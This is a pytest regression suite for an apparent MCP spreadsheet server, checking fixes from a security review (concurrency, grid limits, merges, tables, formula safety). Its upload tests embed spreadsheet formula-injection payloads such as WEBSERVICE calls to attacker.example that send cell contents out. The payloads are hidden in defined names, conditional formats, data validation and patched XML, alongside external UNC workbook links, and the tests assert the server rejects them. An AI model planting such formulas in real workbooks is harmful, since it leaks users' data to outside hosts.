"""Regression tests for defects found in the v1 security review."""

import asyncio
import base64
import io
import zipfile
from collections.abc import Callable
from pathlib import Path

import pytest
from mcp import Client
from openpyxl import Workbook, load_workbook
from openpyxl.drawing.image import Image
from openpyxl.formatting.rule import ColorScaleRule, FormulaRule
from openpyxl.workbook.defined_name import DefinedName
from openpyxl.worksheet.datavalidation import DataValidation
from PIL import Image as PillowImage

from tests.conftest import ToolCall

pytestmark = pytest.mark.anyio


def _text_formula_workbook(path: Path) -> None:
    workbook = Workbook()
    sheet = workbook.worksheets[0]
    sheet.title = "Data"
    sheet.append(["Group", "Value"])
    sheet.append(['=WEBSERVICE("https://attacker.example")', 1])
    sheet["A2"].data_type = "s"
    workbook.save(path)


async def test_copied_text_stays_text(call: ToolCall, files: Path) -> None:
    _text_formula_workbook(files / "t.xlsx")
    await call("copy_range", path="t.xlsx", sheet="Data", range="A2", target_cell="D2")
    assert load_workbook(files / "t.xlsx")["Data"]["D2"].data_type == "s"


async def test_pivot_text_stays_text(call: ToolCall, files: Path) -> None:
    _text_formula_workbook(files / "t.xlsx")
    await call(
        "create_pivot_table",
        path="t.xlsx",
        source_sheet="Data",
        source_range="A1:B2",
        rows=["Group"],
        values=[{"field": "Value"}],
        target_sheet="Data",
        target_cell="F1",
    )
    assert load_workbook(files / "t.xlsx")["Data"]["F2"].data_type == "s"


async def test_copied_formulas_are_checked(call_error: ToolCall, sample: Path, files: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Data"]["E2"] = '=WEBSERVICE("https://attacker.example")'
    workbook.save(sample)
    message = await call_error(
        "copy_range", path="sales.xlsx", sheet="Data", range="E2", target_cell="E3"
    )
    assert "not allowed" in message


async def test_uploads_with_unsafe_formulas_are_rejected(call_error: ToolCall, files: Path) -> None:
    workbook = Workbook()
    workbook.worksheets[0]["A1"] = '=WEBSERVICE("https://attacker.example")'
    buffer = io.BytesIO()
    workbook.save(buffer)
    content = base64.b64encode(buffer.getvalue()).decode()
    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
    assert "not allowed" in message
    assert not (files / "up.xlsx").exists()


async def test_concurrent_edits_are_not_lost(client: Client, sample: Path) -> None:
    results = await asyncio.gather(
        *(
            client.call_tool(
                "write_range",
                {"path": "sales.xlsx", "sheet": "Report", "start_cell": f"A{row}", "rows": [[row]]},
            )
            for row in range(1, 21)
        )
    )
    assert not any(result.is_error for result in results)
    sheet = load_workbook(sample)["Report"]
    assert [sheet[f"A{row}"].value for row in range(1, 21)] == list(range(1, 21))


async def test_edits_keep_pictures(call: ToolCall, sample: Path) -> None:
    picture = io.BytesIO()
    PillowImage.new("RGB", (4, 4), "red").save(picture, format="PNG")
    workbook = load_workbook(sample)
    workbook["Report"].add_image(Image(picture), "C3")
    workbook.save(sample)

    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["x"]])
    assert len(load_workbook(sample).worksheets[1]._images) == 1  # pyright: ignore[reportAttributeAccessIssue]


async def test_writes_past_the_grid_are_rejected(call_error: ToolCall, sample: Path) -> None:
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Data", start_cell="XFD1", rows=[[1, 2]]
    )
    assert "worksheet limits" in message


async def test_inserting_past_the_grid_is_rejected(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"]["A1048576"] = "last"
    workbook.save(sample)
    message = await call_error(
        "insert_rows_or_columns", path="sales.xlsx", sheet="Report", axis="rows", at=1
    )
    assert "past the last" in message


async def test_control_characters_are_rejected(call_error: ToolCall, sample: Path) -> None:
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Data", start_cell="A1", rows=[["a\x01b"]]
    )
    assert "control characters" in message


async def test_overlapping_merges_are_rejected(
    call: ToolCall, call_error: ToolCall, sample: Path
) -> None:
    await call("merge_cells", path="sales.xlsx", sheet="Report", range="A1:B2")
    message = await call_error("merge_cells", path="sales.xlsx", sheet="Report", range="B2:C3")
    assert "overlaps" in message


async def test_invalid_tables_are_rejected(
    call: ToolCall, call_error: ToolCall, sample: Path
) -> None:
    await call("create_table", path="sales.xlsx", sheet="Data", range="A1:D5")
    assert "overlaps" in await call_error(
        "create_table", path="sales.xlsx", sheet="Data", range="A1:B3"
    )
    assert "Invalid table name" in await call_error(
        "create_table", path="sales.xlsx", sheet="Data", range="F1:G2", name="AB12"
    )
    assert "Unknown table style" in await call_error(
        "create_table", path="sales.xlsx", sheet="Data", range="F1:G2", style="NoSuchStyle"
    )


async def test_last_visible_sheet_cannot_be_deleted(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"].sheet_state = "hidden"
    workbook.save(sample)
    assert "visible" in await call_error("delete_sheet", path="sales.xlsx", sheet="Data")


async def test_merged_target_cells_are_rejected(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"].merge_cells("A1:B1")
    workbook.save(sample)
    message = await call_error(
        "copy_range",
        path="sales.xlsx",
        sheet="Data",
        range="A1:B1",
        target_cell="A1",
        target_sheet="Report",
    )
    assert "merged" in message


async def test_chart_anchor_is_normalized(call: ToolCall, sample: Path) -> None:
    await call(
        "create_chart",
        path="sales.xlsx",
        sheet="Report",
        data_sheet="Data",
        data_range="B1:C5",
        chart_type="column",
        anchor_cell=" d5 ",
    )


async def test_find_cells_ignores_empty_grid(call: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"]["XFD1048576"] = "far away"
    workbook.save(sample)
    found = await call("find_cells", path="sales.xlsx", query="far", sheet="Report")
    assert found["matches"] == {"Report": {"XFD1048576": "far away"}}


async def test_list_workbooks_skips_links_outside(
    call: ToolCall, files: Path, tmp_path: Path
) -> None:
    outside = tmp_path / "outside.xlsx"
    Workbook().save(outside)
    try:
        (files / "link.xlsx").symlink_to(outside)
    except OSError:
        pytest.skip("symlinks are not available")
    assert await call("list_workbooks") == {}


async def test_tables_and_sheet_filters_cannot_overlap(
    call: ToolCall, call_error: ToolCall, sample: Path
) -> None:
    await call("create_table", path="sales.xlsx", sheet="Data", range="A1:D5")
    message = await call_error(
        "set_sheet_layout", path="sales.xlsx", sheet="Data", layout={"auto_filter": "A1:D5"}
    )
    assert "own filter" in message


async def test_area_chart_axes_survive_later_edits(call: ToolCall, sample: Path) -> None:
    await call(
        "create_chart",
        path="sales.xlsx",
        sheet="Report",
        data_sheet="Data",
        data_range="B1:C5",
        chart_type="area",
        anchor_cell="B2",
    )
    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["x"]])
    with zipfile.ZipFile(sample) as archive:
        chart_xml = archive.read("xl/charts/chart1.xml").decode()
    assert chart_xml.count('<c:delete val="0"') + chart_xml.count('<delete val="0"') == 2


async def test_macro_enabled_workbooks_can_be_edited(
    call: ToolCall, sample: Path, files: Path
) -> None:
    (files / "macro.xlsm").write_bytes(sample.read_bytes())
    await call("write_range", path="macro.xlsm", sheet="Report", start_cell="A1", rows=[["x"]])
    data = await call("read_range", path="macro.xlsm", sheet="Report")
    assert data["values"] == [["x"]]


ATTACK = 'WEBSERVICE("https://attacker.example/?d="&amp;A1)'
X14_VALIDATION = (
    '<extLst><ext uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}" '
    'xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main">'
    '<x14:dataValidations count="1" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">'
    f'<x14:dataValidation type="list"><x14:formula1><xm:f>{ATTACK}</xm:f></x14:formula1>'
    "<xm:sqref>A1</xm:sqref></x14:dataValidation></x14:dataValidations></ext></extLst>"
)


def _upload(build: Callable[[Workbook], None], patch: tuple[str, str, str] | None = None) -> str:
    """A workbook made by ``build``, optionally with ``old`` replaced by ``new`` in one part."""
    workbook = Workbook()
    workbook.worksheets[0].title = "Data"
    build(workbook)
    buffer = io.BytesIO()
    workbook.save(buffer)
    content = buffer.getvalue()
    if patch:
        part, old, new = patch
        source = zipfile.ZipFile(io.BytesIO(content))
        patched = io.BytesIO()
        with zipfile.ZipFile(patched, "w") as target:
            for name in source.namelist():
                data = source.read(name)
                if name == part:
                    assert old.encode() in data
                    data = data.replace(old.encode(), new.encode())
                target.writestr(name, data)
        content = patched.getvalue()
    return base64.b64encode(content).decode()


def _defined_name(workbook: Workbook) -> None:
    workbook.defined_names.add(DefinedName("evil", attr_text=ATTACK.replace("&amp;", "&")))
    workbook["Data"]["A2"] = "=evil"


def _sheet_name(workbook: Workbook) -> None:
    workbook["Data"].defined_names.add(DefinedName("evil", attr_text=ATTACK.replace("&amp;", "&")))


def _linked_name(workbook: Workbook) -> None:
    workbook.defined_names.add(DefinedName("Sales", attr_text=r"'\203.0.113.7\share\b.xlsx'!Sales"))


def _print_area(workbook: Workbook) -> None:
    workbook["Data"].print_area = "A1:B2"


def _conditional_format(workbook: Workbook) -> None:
    rule = FormulaRule(formula=[ATTACK.replace("&amp;", "&")])
    workbook["Data"].conditional_formatting.add("A1", rule)


def _color_scale(workbook: Workbook) -> None:
    rule = ColorScaleRule(
        start_type="formula",
        start_value=ATTACK.replace("&amp;", "&"),
        start_color="FF0000",
        end_type="max",
        end_color="00FF00",
    )
    workbook["Data"].conditional_formatting.add("A1:A5", rule)


def _validation(workbook: Workbook) -> None:
    validation = DataValidation(type="custom", formula1=ATTACK.replace("&amp;", "&"))
    validation.add("A1")
    workbook["Data"].add_data_validation(validation)


def _nothing(workbook: Workbook) -> None:
    pass


@pytest.mark.parametrize(
    ("build", "patch"),
    [
        (_defined_name, None),
        (_sheet_name, None),
        (_linked_name, None),
        # openpyxl warns about, and drops, print areas and x14 extensions it cannot load.
        pytest.param(
            _print_area,
            ("xl/workbook.xml", "'Data'!$A$1:$B$2", ATTACK),
            marks=pytest.mark.filterwarnings("ignore:Print area"),
        ),
        (_conditional_format, None),
        (_color_scale, None),
        (_validation, None),
        pytest.param(
            _nothing,
            ("xl/worksheets/sheet1.xml", "</worksheet>", X14_VALIDATION + "</worksheet>"),
            marks=pytest.mark.filterwarnings("ignore:Data Validation extension"),
        ),
    ],
)
async def test_uploads_check_formulas_outside_cells(
    call_error: ToolCall,
    files: Path,
    build: Callable[[Workbook], None],
    patch: tuple[str, str, str] | None,
) -> None:
    content = _upload(build, patch)
    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
    assert "not allowed" in message
    assert not (files / "up.xlsx").exists()


async def test_uploads_with_rules_and_names_on_own_sheets_are_accepted(
    call: ToolCall, files: Path
) -> None:
    def build(workbook: Workbook) -> None:
        lists = workbook.create_sheet("Lists")
        lists.append(["a"])
        data = workbook["Data"]
        workbook.defined_names.add(DefinedName("Choices", attr_text="Lists!$A$1:$A$3"))
        data.print_area = "A1:C10"
        data.conditional_formatting.add("A1:A5", FormulaRule(formula=["Lists!$A$1>0"]))
        validation = DataValidation(type="list", formula1="Choices")
        validation.add("B1")
        data.add_data_validation(validation)
        data["C1"] = "=SUM(Lists!A1:A3)"

    await call("import_workbook", path="up.xlsx", content_base64=_upload(build))
    assert load_workbook(files / "up.xlsx").sheetnames == ["Data", "Lists"]


@pytest.mark.parametrize(
    "formula",
    [
        r"='\203.0.113.7\share\book.xlsx'!Sales",
        "=SUM(Budget.xlsx!Sales)",
        "=SUM([1]Sheet1!A1:OFFSET(A1,0,0))",
        '=SUM(A1:INDIRECT("B2"))',
    ],
)
async def test_written_formulas_cannot_reach_other_workbooks(
    call_error: ToolCall, sample: Path, formula: str
) -> None:
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[[formula]]
    )
    assert "not allowed" in message
